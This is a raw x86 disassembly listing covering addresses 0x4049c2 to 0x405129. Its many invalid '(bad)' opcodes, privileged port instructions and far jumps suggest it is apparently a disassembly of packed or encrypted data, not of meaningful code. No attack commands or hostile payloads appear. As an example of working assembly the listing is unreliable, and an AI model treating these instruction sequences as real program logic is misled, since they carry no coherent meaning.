  4049c2:	xchg   edx,eax
  4049c3:	cld    
  4049c4:	out    0x7d,eax
  4049c6:	xchg   edi,eax
  4049c7:	cmp    DWORD PTR [esi],0xffffff80
  4049ca:	and    edi,DWORD PTR [ebp+ecx*4+0x773489c5]
  4049d1:	push   0xffffffed
  4049d3:	jae    0x404a43
  4049d5:	pop    esi
  4049d6:	push   cs
  4049d7:	nop    esi
  4049da:	cmp    bl,dh
  4049dc:	arpl   WORD PTR [ebx+0x47],di
  4049df:	ror    BYTE PTR [esi],1
  4049e1:	clc    
  4049e2:	add    edx,esp
  4049e4:	fs test esp,edi
  4049e7:	es cmp eax,0xb30d290f
  4049ed:	pop    es
  4049ee:	xchg   ecx,eax
  4049ef:	lahf   
  4049f0:	mov    eax,ds:0xfb073c16
  4049f5:	enter  0xe6a9,0xf4
  4049f9:	push   ebx
  4049fa:	push   es
  4049fb:	outs   dx,BYTE PTR ds:[esi]
  4049fc:	sbb    ecx,0x4befb341
  404a02:	pop    esi
  404a03:	dec    eax
  404a04:	les    ecx,FWORD PTR [ebx]
  404a06:	jae    0x404a2d
  404a08:	sub    eax,0xd12c99bd
  404a0d:	cwde   
  404a0e:	pop    ebp
  404a0f:	pop    esi
  404a10:	ret    0xdaf1
  404a13:	inc    eax
  404a14:	out    0x62,al
  404a16:	popf   
  404a17:	pop    esp
  404a18:	std    
  404a19:	sbb    ebx,DWORD PTR ds:0xc9f1a760
  404a1f:	out    0xac,eax
  404a21:	out    dx,eax
  404a22:	sahf   
  404a23:	dec    edi
  404a24:	aaa    
  404a25:	iret   
  404a26:	push   ds
  404a27:	stos   BYTE PTR es:[edi],al
  404a28:	aad    0x75
  404a2a:	sti    
  404a2b:	cdq    
  404a2c:	mov    dl,0x95
  404a2e:	aas    
  404a2f:	push   eax
  404a30:	test   eax,0xe5780bc0
  404a35:	jmp    0x60c318a2
  404a3a:	jmp    0x2058:0x15d8c5f1
  404a41:	fisub  DWORD PTR [eax]
  404a43:	fwait
  404a44:	mov    esi,0xe1cac231
  404a49:	xor    DWORD PTR [ebp+0x3e],ebx
  404a4c:	(bad)  
  404a4d:	not    dl
  404a4f:	xchg   edx,eax
  404a50:	sbb    bl,BYTE PTR [eax]
  404a52:	out    0x7b,al
  404a54:	dec    BYTE PTR [ecx+eax*4-0x7]
  404a58:	les    esi,FWORD PTR [edi]
  404a5a:	ret    
  404a5b:	push   0x84a15c9b
  404a60:	aad    0x4b
  404a62:	cmp    bh,0xb9
  404a65:	cld    
  404a66:	dec    edi
  404a67:	mov    dl,0x9a
  404a69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a6a:	adc    eax,0xbe4c9af4
  404a6f:	clc    
  404a70:	cmc    
  404a71:	fs sub ebx,eax
  404a74:	sti    
  404a75:	jecxz  0x404abf
  404a77:	mov    edx,0xf06a1dc1
  404a7c:	mov    ch,0x4f
  404a7e:	jnp    0x404ad4
  404a80:	in     al,0x4b
  404a82:	arpl   WORD PTR [esp+ecx*4+0x69],si
  404a86:	mov    al,0x86
  404a88:	xchg   esi,eax
  404a89:	dec    esi
  404a8a:	dec    esp
  404a8b:	xchg   ebx,eax
  404a8c:	ficom  DWORD PTR [esi-0x491f4950]
  404a92:	push   ds
  404a93:	push   ebp
  404a94:	mov    DWORD PTR [ebx],esp
  404a96:	js     0x404ad7
  404a98:	mov    ebx,0xcaab8a8
  404a9d:	inc    edx
  404a9e:	idiv   cl
  404aa0:	jmp    0x404a23
  404aa2:	(bad)  
  404aa3:	fldenv [ebx+esi*1+0xf]
  404aa7:	jge    0x404a9e
  404aa9:	push   esi
  404aaa:	fist   WORD PTR [ebx+edi*8+0x1db3529]
  404ab1:	fcomp  DWORD PTR [eax+0x1071c1e3]
  404ab7:	daa    
  404ab8:	std    
  404ab9:	aaa    
  404aba:	arpl   WORD PTR [esi-0x2e],di
  404abd:	int3   
  404abe:	mov    esi,0x43855be0
  404ac3:	add    BYTE PTR [edx+0x58],al
  404ac6:	cwde   
  404ac7:	stos   DWORD PTR es:[edi],eax
  404ac8:	addr16 add ch,0xe6
  404acc:	mov    dl,0xe6
  404ace:	mov    DWORD PTR [ebx],ecx
  404ad0:	test   al,0x3d
  404ad2:	push   esp
  404ad3:	retf   0xb617
  404ad6:	mov    BYTE PTR [ecx-0x18267220],cl
  404adc:	dec    ebx
  404add:	(bad)  [esi+eax*1]
  404ae0:	mov    ds:0xd42d416f,eax
  404ae5:	jmp    0x404b58
  404ae7:	scas   eax,DWORD PTR es:[edi]
  404ae8:	call   DWORD PTR [ebx]
  404aea:	xchg   BYTE PTR [ecx+0x16],ah
  404aed:	inc    edi
  404aee:	pusha  
  404aef:	out    0x4a,eax
  404af1:	push   0xa57c704c
  404af6:	in     al,dx
  404af7:	dec    edi
  404af8:	jb     0x404b3e
  404afa:	pop    ebp
  404afb:	pusha  
  404afc:	xchg   DWORD PTR [eax+ecx*4+0x3b],ecx
  404b00:	xor    eax,0x1ac2e51
  404b05:	xor    bh,BYTE PTR [eax+0x75]
  404b08:	js     0x404b1d
  404b0a:	cmp    esi,edi
  404b0c:	(bad)  
  404b0d:	sub    eax,0xaee30525
  404b12:	hlt    
  404b13:	leave  
  404b14:	xchg   ecx,eax
  404b16:	xchg   BYTE PTR [esi],bh
  404b18:	xchg   ebp,eax
  404b19:	inc    edi
  404b1a:	daa    
  404b1b:	xor    ecx,ebx
  404b1d:	pop    esp
  404b1e:	adc    dh,dl
  404b20:	adc    WORD PTR [edx+0xf3813e],sp
  404b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b28:	or     ch,BYTE PTR [eax-0x7b]
  404b2b:	adc    BYTE PTR [ecx+0x18],0x77
  404b2f:	mov    ah,0x11
  404b31:	sar    DWORD PTR [ebx],1
  404b33:	mov    cl,0x10
  404b35:	pop    ds
  404b36:	call   0x6603:0x9f298f
  404b3d:	bound  eax,QWORD PTR es:[esi]
  404b40:	leave  
  404b41:	imul   ebp,ebp,0xf34ea6d8
  404b47:	push   ds
  404b48:	arpl   WORD PTR [edi+0x7c],di
  404b4b:	jp     0x404af0
  404b4d:	mov    bl,0xdd
  404b4f:	rcr    esi,cl
  404b51:	push   esi
  404b52:	mov    al,0x3f
  404b54:	mov    esp,0x174d39ef
  404b59:	mov    edi,0x1d8e5b6d
  404b5e:	xor    ch,ah
  404b60:	xchg   edi,eax
  404b61:	add    eax,DWORD PTR [edx-0xf]
  404b64:	adc    cl,bh
  404b66:	mov    ecx,0x3dd26539
  404b6b:	ficom  WORD PTR [eax-0x7b]
  404b6e:	mov    ds:0x9d7d6477,al
  404b73:	test   al,0xb3
  404b75:	add    DWORD PTR ds:0x4c609bb0,esi
  404b7b:	imul   eax,DWORD PTR [ebx+0x5b],0xc28e037c
  404b82:	adc    DWORD PTR [eax+0x65],esi
  404b85:	xor    BYTE PTR [ebx],0xa4
  404b88:	rcl    DWORD PTR [ebx-0x62],0xcc
  404b8c:	sub    ebp,DWORD PTR [edi-0x19cf64c]
  404b92:	mov    DWORD PTR [ecx+0x773c4340],ecx
  404b98:	xor    al,0x6
  404b9a:	adc    BYTE PTR [ecx],bh
  404b9c:	and    al,0xe0
  404b9e:	fst    DWORD PTR [edi*2+0x58b5e6a0]
  404ba5:	int    0xc2
  404ba7:	mov    ?,WORD PTR [edx+ecx*2]
  404baa:	sti    
  404bab:	jb     0x404bcf
  404bad:	call   0x7569:0x8688e57c
  404bb4:	call   0x1ea6194c
  404bb9:	or     DWORD PTR [edx+0x50],eax
  404bbc:	cmp    ebx,DWORD PTR ds:0x8a4a3c7e
  404bc2:	enter  0x38c6,0x79
  404bc6:	cwde   
  404bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bc9:	es stos BYTE PTR es:[edi],al
  404bcb:	dec    ebx
  404bcc:	(bad)  
  404bcd:	dec    ebx
  404bce:	or     ah,bh
  404bd0:	call   0x386d:0xbee4df5d
  404bd7:	fwait
  404bd8:	push   eax
  404bd9:	jl     0x404bb5
  404bdb:	out    dx,al
  404bdc:	aam    0xb1
  404bde:	mov    bl,0xaf
  404be0:	mov    edi,0xb34d846e
  404be5:	sub    al,0xca
  404be7:	jmp    0xb186:0x7d644234
  404bee:	xor    DWORD PTR [eax+0x0],ecx
  404bf1:	pop    esp
  404bf2:	mov    ds:0xe48adb4e,eax
  404bf7:	ret    
  404bf8:	dec    esp
  404bf9:	jmp    0x404be2
  404bfb:	scas   al,BYTE PTR es:[edi]
  404bfc:	mov    BYTE PTR [ebx+edx*1-0x51e4261e],cl
  404c03:	call   DWORD PTR [eax-0x76]
  404c06:	mov    bl,0x8
  404c08:	sub    edx,DWORD PTR [esi+0x15]
  404c0b:	jle    0x404bff
  404c0d:	aad    0xba
  404c0f:	jmp    0x404c6e
  404c11:	xchg   edx,eax
  404c12:	push   esp
  404c13:	cmp    ah,BYTE PTR [ebx+ebp*1]
  404c16:	push   eax
  404c17:	in     eax,0x34
  404c19:	mov    ecx,0xe5ff6f27
  404c1e:	mul    DWORD PTR ds:0x2afb0106
  404c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c25:	aad    0xd2
  404c27:	in     al,dx
  404c28:	mov    cl,al
  404c2a:	shl    DWORD PTR [ecx-0x1201ee66],0xe6
  404c31:	mov    esi,0xb8af7c6c
  404c36:	adc    eax,0xaf6bcfcd
  404c3b:	and    DWORD PTR [esp+eiz*2],0xffffffed
  404c3f:	imul   ebx,DWORD PTR [ebx+0x1e],0x28
  404c43:	int3   
  404c44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c45:	add    DWORD PTR [ebx],esp
  404c47:	pop    ecx
  404c48:	dec    ebx
  404c49:	stos   DWORD PTR es:[edi],eax
  404c4a:	cli    
  404c4b:	push   edi
  404c4c:	pop    edi
  404c4d:	sti    
  404c4e:	(bad)  
  404c4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c50:	jo     0x404c64
  404c52:	inc    edi
  404c53:	pop    ebp
  404c54:	sbb    esp,DWORD PTR [eax+0x1c599a76]
  404c5a:	imul   cl
  404c5c:	imul   edx,DWORD PTR [ecx+0x5617f7be],0xe9aae9d6
  404c66:	adc    ebp,ebx
  404c68:	dec    ecx
  404c69:	inc    edi
  404c6a:	in     al,0x3a
  404c6c:	push   ss
  404c6d:	cmp    eax,DWORD PTR [edi-0x70da9a13]
  404c73:	jecxz  0x404c79
  404c75:	sub    eax,DWORD PTR [eax+ebp*8+0x3e]
  404c79:	lock rcl BYTE PTR [ecx-0x6c],0x7
  404c7e:	cmc    
  404c7f:	mov    al,ds:0x5eaab877
  404c84:	(bad)  
  404c85:	pusha  
  404c86:	loopne 0x404c20
  404c88:	xor    cl,BYTE PTR [eax+0x40006e94]
  404c8e:	mov    esi,0x3ddb9ab3
  404c93:	fwait
  404c94:	mov    ebx,0xf4fd98c2
  404c99:	mov    cl,dl
  404c9b:	(bad)  
  404c9c:	out    0xe0,eax
  404c9e:	pop    eax
  404c9f:	jno    0x404cfa
  404ca1:	mov    WORD PTR [ebx],?
  404ca3:	aad    0x95
  404ca5:	push   eax
  404ca6:	dec    ecx
  404ca7:	push   esi
  404ca8:	shr    DWORD PTR [eax-0x436f80b5],0xb0
  404caf:	fwait
  404cb0:	sbb    al,0xc4
  404cb2:	add    ah,BYTE PTR [ebx-0x7]
  404cb5:	ret    
  404cb6:	mov    al,0xf8
  404cb8:	in     al,0xb4
  404cba:	push   es
  404cbb:	rcr    BYTE PTR [ebp+0x6d],0x43
  404cbf:	xchg   esi,eax
  404cc0:	mov    ch,0x1f
  404cc2:	sbb    bl,cl
  404cc4:	cmp    BYTE PTR [esi+0x485905a1],bl
  404cca:	shr    BYTE PTR [edi],0xa6
  404ccd:	cmp    DWORD PTR [edi+0x57365d21],edi
  404cd3:	inc    esi
  404cd4:	pop    ds
  404cd5:	sub    ecx,edx
  404cd7:	mov    edx,0xc5962d3e
  404cdc:	fs pop esp
  404cde:	sbb    al,0x18
  404ce0:	or     BYTE PTR ds:0xb83961fb,dh
  404ce6:	mov    edi,0x90d9a1c7
  404ceb:	or     DWORD PTR [eax-0x41],esp
  404cee:	sub    edx,DWORD PTR [eax]
  404cf0:	or     DWORD PTR [ebp-0x677d592],eax
  404cf6:	mov    al,0x85
  404cf8:	out    dx,al
  404cf9:	in     al,0xed
  404cfb:	xlat   BYTE PTR ds:[ebx]
  404cfc:	pop    edi
  404cfd:	call   0x6026f7a5
  404d02:	adc    esp,DWORD PTR [esi+0x68]
  404d05:	mov    ?,WORD PTR [ebx+0x7ff03389]
  404d0b:	push   eax
  404d0c:	sahf   
  404d0d:	pop    ecx
  404d0e:	(bad)  
  404d0f:	cli    
  404d10:	mov    ds:0xa2f7475d,al
  404d15:	mov    dl,0x59
  404d17:	nop
  404d18:	xlat   BYTE PTR ds:[ebx]
  404d19:	out    0x34,al
  404d1b:	mov    cl,0x18
  404d1d:	(bad)  
  404d1e:	fs (bad) 
  404d20:	and    DWORD PTR [eax-0x74223021],edi
  404d26:	int3   
  404d27:	pop    esp
  404d28:	aam    0xdc
  404d2a:	js     0x404d5c
  404d2c:	out    0xf8,al
  404d2e:	jae    0x404d50
  404d30:	lods   al,BYTE PTR ds:[esi]
  404d31:	enter  0xc252,0x9f
  404d35:	or     dl,0x30
  404d38:	jno    0x404ce4
  404d3a:	mov    ds,eax
  404d3c:	mov    ebx,0x505daae6
  404d41:	push   edx
  404d42:	out    dx,eax
  404d43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d44:	mov    DWORD PTR [esi],edx
  404d46:	in     eax,dx
  404d47:	xchg   edx,eax
  404d48:	or     al,0x7d
  404d4a:	jnp    0x404d84
  404d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d4d:	add    al,0x51
  404d4f:	and    al,0xc9
  404d51:	int3   
  404d52:	and    ecx,DWORD PTR [ecx+0x64]
  404d55:	sti    
  404d56:	sub    edx,0xffffffa3
  404d59:	push   es
  404d5a:	lods   eax,DWORD PTR ds:[esi]
  404d5b:	sub    bl,bh
  404d5d:	rcl    DWORD PTR [ebp-0x6e],cl
  404d60:	shr    BYTE PTR [ebx],1
  404d62:	ret    0x430b
  404d65:	mov    bl,0x9e
  404d67:	ror    dl,cl
  404d69:	int3   
  404d6a:	jge    0x404d90
  404d6c:	and    edx,DWORD PTR [edx+ebp*1-0x6d689f52]
  404d73:	or     eax,0x4f209933
  404d78:	adc    BYTE PTR [edx-0x2f],dl
  404d7b:	cmp    al,dh
  404d7d:	je     0x404d60
  404d7f:	test   al,0x45
  404d81:	sar    edi,1
  404d83:	int    0xbe
  404d85:	jo     0x404dc0
  404d87:	(bad)  
  404d88:	cmp    edi,edx
  404d8a:	and    ch,bl
  404d8c:	sub    eax,ecx
  404d8e:	jp     0x404e01
  404d90:	push   0x7e
  404d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d93:	in     al,0x24
  404d95:	inc    esp
  404d96:	out    0x22,eax
  404d98:	xchg   ecx,eax
  404d99:	pop    edx
  404d9a:	in     eax,dx
  404d9b:	stos   BYTE PTR es:[edi],al
  404d9c:	xor    al,0x15
  404d9e:	or     DWORD PTR [ecx-0x31],ecx
  404da1:	xor    DWORD PTR [esi-0x15],ebx
  404da4:	(bad)  
  404da6:	push   esp
  404da7:	mov    ds:0x32beea6e,eax
  404dac:	jmp    0xacad:0x59cd5c7a
  404db3:	fisub  DWORD PTR ss:[edx+0x8d1920f]
  404dba:	xchg   ebx,eax
  404dbb:	xchg   ebx,eax
  404dbc:	cwde   
  404dbd:	test   eax,0x48379a8f
  404dc2:	loope  0x404d98
  404dc4:	sub    edi,DWORD PTR [edi+0x47d996df]
  404dca:	adc    eax,0xe1b6b183
  404dcf:	leave  
  404dd0:	mov    ?,edi
  404dd2:	jbe    0x404d5f
  404dd4:	out    dx,al
  404dd5:	retf   0xc56c
  404dd8:	rol    BYTE PTR [edx-0x7e87cc6],0xd8
  404ddf:	mov    ah,0xba
  404de1:	push   cs
  404de2:	sbb    edx,esp
  404de4:	nop
  404de5:	es repnz mov ebx,0xf1a0f3ed
  404dec:	mov    edi,DWORD PTR [esi-0xf]
  404def:	sbb    al,0x38
  404df1:	sbb    eax,eax
  404df3:	dec    edi
  404df4:	mov    ch,dl
  404df6:	fwait
  404df7:	stc    
  404df8:	aas    
  404df9:	cld    
  404dfa:	and    al,BYTE PTR ds:0x4aac0e2c
  404e00:	or     eax,0xc9862c04
  404e05:	aas    
  404e06:	outs   dx,DWORD PTR ds:[esi]
  404e07:	xor    DWORD PTR [ebp-0x57],edx
  404e0a:	cld    
  404e0b:	jle    0x404e23
  404e0d:	fnsave [eax+0x3]
  404e10:	mov    BYTE PTR [edx+0x77fa25b4],ch
  404e16:	sub    esp,DWORD PTR [edx+0x524b73d7]
  404e1c:	sub    DWORD PTR [edx],esp
  404e1e:	mov    esi,ebp
  404e20:	jae    0x404e85
  404e22:	lods   eax,DWORD PTR ds:[esi]
  404e23:	out    dx,eax
  404e24:	add    ah,cl
  404e26:	xor    edi,ecx
  404e28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e29:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  404e2b:	push   cs
  404e2c:	out    0x36,al
  404e2e:	scas   eax,DWORD PTR es:[edi]
  404e2f:	dec    esi
  404e30:	jne    0x404e78
  404e32:	dec    ch
  404e34:	(bad)  
  404e35:	sti    
  404e36:	inc    ebp
  404e37:	outs   dx,BYTE PTR ds:[esi]
  404e38:	dec    ecx
  404e39:	push   esi
  404e3a:	cmp    eax,0x3698cb9a
  404e3f:	mov    ds:0x707b88f3,eax
  404e44:	or     ebp,DWORD PTR [edi-0xd]
  404e47:	fs ret 
  404e49:	out    0xd7,al
  404e4b:	sbb    eax,0xef274deb
  404e50:	mov    ebx,0xd55f7e75
  404e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e56:	jmp    0x481cf0ba
  404e5b:	mov    ds:0x35eb3803,al
  404e60:	push   ecx
  404e61:	push   ecx
  404e62:	cmp    BYTE PTR [edx+0x69],ch
  404e65:	pop    es
  404e66:	dec    ebx
  404e67:	out    dx,al
  404e68:	cmc    
  404e69:	mov    eax,ds:0x36be2d04
  404e6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e6f:	outs   dx,BYTE PTR ds:[esi]
  404e70:	push   edi
  404e71:	arpl   WORD PTR ds:0x921471b,si
  404e77:	test   eax,0x8fde1e60
  404e7c:	pop    es
  404e7d:	push   ebx
  404e7e:	jae    0x404e10
  404e80:	out    0x46,eax
  404e82:	jge    0x404ea3
  404e84:	inc    esp
  404e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e86:	push   eax
  404e87:	cmp    BYTE PTR [ebp-0xa],dh
  404e8a:	or     cl,al
  404e8c:	cmp    cl,0xd5
  404e8f:	adc    al,0xbb
  404e91:	(bad)  
  404e92:	(bad)  
  404e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e96:	sbb    eax,0x2fa5656
  404e9b:	ins    DWORD PTR es:[edi],dx
  404e9c:	xlat   BYTE PTR ds:[ebx]
  404e9d:	mov    ebp,edx
  404e9f:	nop
  404ea0:	push   0x76e03c9d
  404ea5:	stos   DWORD PTR es:[edi],eax
  404ea6:	ins    BYTE PTR es:[edi],dx
  404ea7:	pop    edx
  404ea8:	ja     0x404e2f
  404eaa:	in     al,dx
  404eab:	fwait
  404eac:	iret   
  404ead:	cs loopne 0x404e3c
  404eb0:	push   ebp
  404eb1:	mov    ecx,0x19b3fac3
  404eb6:	adc    eax,0xe874c51b
  404ebb:	and    BYTE PTR [ebx],ch
  404ebd:	push   edi
  404ebe:	addr16 jp 0x404e8a
  404ec1:	jb     0x404f14
  404ec3:	sub    al,0xf
  404ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ec6:	mov    dl,al
  404ec8:	ds mov cl,0x74
  404ecb:	and    dl,BYTE PTR [esi+0x20]
  404ece:	bnd ret 0x4e04
  404ed2:	cmp    bh,BYTE PTR [ecx-0x2b6fcc30]
  404ed8:	jmp    0x404f24
  404eda:	lods   al,BYTE PTR ds:[esi]
  404edb:	shr    DWORD PTR [edx],0x92
  404ede:	push   ecx
  404edf:	sbb    cl,al
  404ee1:	cmp    BYTE PTR [eax],ah
  404ee3:	popf   
  404ee4:	(bad)  
  404ee5:	xchg   ebx,eax
  404ee6:	xlat   BYTE PTR ds:[ebx]
  404ee7:	cmp    DWORD PTR [ebp-0x5477d841],eax
  404eed:	(bad)  
  404eef:	push   ebp
  404ef0:	mov    DWORD PTR [eax+0x10],edi
  404ef3:	jg     0x404ec7
  404ef5:	fst    QWORD PTR [ebp-0x137fce5c]
  404efb:	xchg   DWORD PTR [edi],ebp
  404efd:	in     eax,dx
  404efe:	and    DWORD PTR [ebp-0x130a135f],0xe9d7fd57
  404f08:	pop    eax
  404f09:	xor    al,0x4f
  404f0b:	rcr    eax,cl
  404f0d:	push   esp
  404f0e:	sbb    al,0xc
  404f10:	xor    edx,DWORD PTR [eax]
  404f12:	mov    cl,cl
  404f14:	xchg   esi,eax
  404f15:	cdq    
  404f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f17:	mov    ch,0xf3
  404f19:	dec    edx
  404f1a:	jp     0x404f0d
  404f1c:	pusha  
  404f1d:	test   eax,0xd59b63fb
  404f22:	mov    esi,0x3f77bd70
  404f27:	add    eax,0x622c60de
  404f2c:	leave  
  404f2d:	dec    ebx
  404f2e:	lds    eax,FWORD PTR [edx+0x102b3dcf]
  404f34:	lock lock cli 
  404f37:	adc    al,0xed
  404f39:	push   edi
  404f3a:	pop    edx
  404f3b:	jne    0x404f7b
  404f3d:	mov    ebp,0x17892410
  404f42:	mov    ebx,0xbbc4dd90
  404f47:	cmp    eax,0xab982255
  404f4c:	pop    eax
  404f4d:	sub    eax,0x87f94598
  404f52:	dec    ebx
  404f53:	cmp    BYTE PTR [ebx+0x2b],ah
  404f56:	mov    edx,edx
  404f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f59:	pop    ecx
  404f5a:	scas   al,BYTE PTR es:[edi]
  404f5b:	jne    0x404efb
  404f5d:	and    eax,0xd6d16f3b
  404f62:	and    al,0x98
  404f64:	cmp    eax,0x873fcff6
  404f69:	xchg   ecx,eax
  404f6a:	shl    BYTE PTR [eax+eax*8],cl
  404f6d:	jg     0x404fb8
  404f6f:	fsubr  st,st(2)
  404f71:	lock leave 
  404f73:	fsub   DWORD PTR [edi]
  404f75:	add    BYTE PTR [esi],cl
  404f77:	and    bl,al
  404f79:	dec    esi
  404f7a:	iret   
  404f7b:	das    
  404f7c:	xor    bl,ah
  404f7e:	and    al,0x72
  404f80:	push   esp
  404f81:	fldenv [edi+0x11]
  404f84:	xchg   ebx,eax
  404f85:	cmp    DWORD PTR [eax+0x633ba335],esp
  404f8b:	inc    esp
  404f8c:	dec    ebp
  404f8d:	cmp    edx,ecx
  404f8f:	fadd   DWORD PTR [ebp+0x4e]
  404f92:	dec    edi
  404f93:	fwait
  404f94:	pusha  
  404f95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f96:	into   
  404f97:	ret    0x6034
  404f9a:	or     al,0x80
  404f9c:	shr    edi,1
  404f9e:	sbb    ah,BYTE PTR [esi+edi*1-0x6f995d9f]
  404fa5:	mov    BYTE PTR es:[edx],0xa
  404fa9:	adc    al,0xf0
  404fab:	dec    edx
  404fac:	xchg   ecx,eax
  404fad:	dec    ebx
  404fae:	test   al,0xe4
  404fb0:	mov    al,0xa9
  404fb2:	dec    ebp
  404fb3:	or     dl,0xad
  404fb6:	xchg   ebp,eax
  404fb7:	lods   eax,DWORD PTR ds:[esi]
  404fb8:	xor    DWORD PTR [esi],0xffffff8b
  404fbb:	xor    eax,0x7fb22cb4
  404fc0:	and    bh,BYTE PTR [edi-0x70]
  404fc3:	mov    ecx,0x6eba19da
  404fc8:	jo     0x404fec
  404fca:	inc    edi
  404fcb:	dec    edx
  404fcc:	and    BYTE PTR [ebp-0x52],0x7d
  404fd0:	data16 adc al,0x66
  404fd3:	in     al,0x81
  404fd5:	cmp    eax,0x6444f665
  404fda:	std    
  404fdb:	fs (bad) 
  404fdd:	lods   eax,DWORD PTR ds:[esi]
  404fde:	scas   al,BYTE PTR es:[edi]
  404fdf:	sub    edx,edx
  404fe1:	lea    edi,ss:[edi+0x1490c493]
  404fe8:	sar    ebx,1
  404fea:	xor    DWORD PTR [ecx+0x54],ebx
  404fed:	lahf   
  404fee:	add    al,BYTE PTR [edx+0x78120d8b]
  404ff4:	dec    esi
  404ff5:	sbb    ebp,eax
  404ff7:	test   BYTE PTR [edx],dl
  404ff9:	push   edi
  404ffa:	ins    DWORD PTR es:[edi],dx
  404ffb:	inc    ebx
  404ffc:	xor    eax,0x4537556b
  405001:	(bad)  
  405002:	cmc    
  405003:	outs   dx,BYTE PTR ds:[esi]
  405004:	dec    eax
  405005:	sub    BYTE PTR [edi+ecx*8],dh
  405008:	mov    bl,0xa2
  40500a:	es push 0x3d5ca533
  405010:	fsub   QWORD PTR [edx+ebp*4-0x6601e06d]
  405017:	(bad)  
  405018:	stos   DWORD PTR es:[edi],eax
  405019:	jmp    0x92c7:0xdfe5c465
  405020:	mov    bh,0xaf
  405022:	jbe    0x404fc3
  405024:	mov    ah,0x10
  405026:	addr16 out 0x9e,al
  405029:	les    edx,FWORD PTR [edx+eax*1+0x3af13f0f]
  405030:	fisttp DWORD PTR [eax]
  405032:	adc    ch,BYTE PTR [esi+0x7a48ba43]
  405038:	lock xchg esi,eax
  40503a:	xor    al,0x11
  40503c:	push   es
  40503d:	push   ebp
  40503e:	in     eax,dx
  40503f:	outs   dx,BYTE PTR ds:[esi]
  405040:	imul   esi,DWORD PTR [edi],0xffffffb9
  405043:	mov    eax,ebx
  405045:	ins    DWORD PTR es:[edi],dx
  405046:	jmp    0x40505c
  405048:	(bad)  
  405049:	jecxz  0x405087
  40504b:	ins    BYTE PTR es:[edi],dx
  40504c:	adc    cl,BYTE PTR [edx]
  40504e:	ds push ebp
  405050:	dec    edx
  405051:	or     eax,0x398e2611
  405056:	aaa    
  405057:	jecxz  0x405013
  405059:	repz aas 
  40505b:	push   esp
  40505c:	es add ebx,esp
  40505f:	jmp    0x872:0x92aaf30e
  405066:	xchg   cl,ch
  405068:	adc    eax,0x23bd03aa
  40506d:	test   eax,0xcca300ea
  405072:	test   eax,0x5f9d9162
  405077:	lock mov ds:0x2d4217cc,eax
  40507d:	push   esi
  40507e:	xor    eax,0xf79aad9e
  405083:	nop
  405084:	fcom   QWORD PTR [esi]
  405086:	daa    
  405087:	dec    DWORD PTR [edx]
  405089:	pop    ebx
  40508a:	sbb    edx,DWORD PTR [ebx-0x63de18c9]
  405090:	xchg   ecx,eax
  405091:	(bad)  
  405092:	aad    0x13
  405094:	cmp    al,BYTE PTR [ecx+0x38]
  405097:	loop   0x4050ae
  405099:	mov    ch,0xb1
  40509b:	repz in al,0xbd
  40509e:	into   
  40509f:	fst    DWORD PTR [ebx-0x4]
  4050a2:	push   0xb63accbd
  4050a7:	cld    
  4050a8:	popa   
  4050a9:	lds    edx,FWORD PTR [ebp+0x5a]
  4050ac:	cmp    BYTE PTR [ecx+0xda98e41],cl
  4050b2:	jle    0x4050ab
  4050b4:	inc    ecx
  4050b5:	sub    eax,0x45401ba8
  4050ba:	std    
  4050bb:	es xchg ebx,eax
  4050bd:	rcr    bh,1
  4050bf:	repz popf 
  4050c1:	in     eax,0x5a
  4050c3:	pushf  
  4050c4:	xlat   BYTE PTR ds:[ebx]
  4050c5:	jnp    0x405066
  4050c7:	sti    
  4050c8:	pop    esi
  4050c9:	jo     0x4050c3
  4050cb:	dec    edx
  4050cc:	mov    al,0x21
  4050ce:	or     DWORD PTR [esp+eax*8-0x743dc316],ebx
  4050d5:	stos   BYTE PTR es:[edi],al
  4050d6:	inc    ebx
  4050d7:	iret   
  4050d8:	sub    ah,BYTE PTR [edi+0x63]
  4050db:	push   eax
  4050dc:	clc    
  4050dd:	or     al,BYTE PTR [edi-0xd]
  4050e0:	lods   eax,DWORD PTR ds:[esi]
  4050e1:	add    bl,dh
  4050e3:	inc    edi
  4050e4:	fist   WORD PTR [ecx]
  4050e6:	std    
  4050e7:	xchg   ecx,eax
  4050e8:	clc    
  4050e9:	push   ecx
  4050ea:	xchg   edx,eax
  4050eb:	mov    bl,BYTE PTR [edx]
  4050ed:	ror    BYTE PTR [esi+0x2f],0x4c
  4050f1:	mov    bl,BYTE PTR [ebp+ebp*1-0x22]
  4050f5:	jp     0x4050b6
  4050f7:	pop    ds
  4050f8:	dec    edi
  4050f9:	sub    eax,0xdd60d388
  4050fe:	xor    bh,BYTE PTR [ecx+0x9c910e8]
  405104:	push   es
  405105:	mov    bl,0x84
  405107:	xchg   esp,eax
  405108:	mov    edx,0xa87a7a95
  40510d:	in     al,0x27
  40510f:	add    al,0x8f
  405111:	push   eax
  405112:	(bad)  
  405113:	loop   0x40513b
  405115:	jp     0x4050b6
  405117:	rol    al,cl
  405119:	cmp    al,0x5c
  40511b:	push   ebx
  40511c:	mov    ch,BYTE PTR [eax]
  40511e:	scas   al,BYTE PTR es:[edi]
  40511f:	cmp    ebp,ebx
  405121:	enter  0xd504,0x0
  405125:	xchg   ebx,eax
  405126:	out    0x1a,al
  405128:	xchg   ebx,eax
  405129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
